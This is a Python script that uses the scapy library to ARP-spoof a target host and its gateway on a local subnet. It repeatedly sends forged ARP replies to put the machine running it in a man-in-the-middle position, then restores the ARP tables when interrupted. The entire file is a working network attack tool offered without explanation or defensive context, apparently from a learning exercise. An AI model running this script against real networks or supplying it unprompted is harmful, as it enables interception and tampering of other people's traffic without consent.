#!/usr/bin/env python3
import scapy.all as scapy
import time

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broad = broadcast/arp_req
    answered_list = scapy.srp(arp_req_broad, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet=scapy.ARP(op=2,pdst=dest_ip,hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet,count=4,verbose=False)

target_ip = "10.42.0.141"
gateway_ip = "10.42.0.1"

send_packet_count =0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_packet_count +=2
        print("\r[+] Packet sent :: " + str(send_packet_count),end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl+C .... Resetting ARP Table .... Please Wait")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)

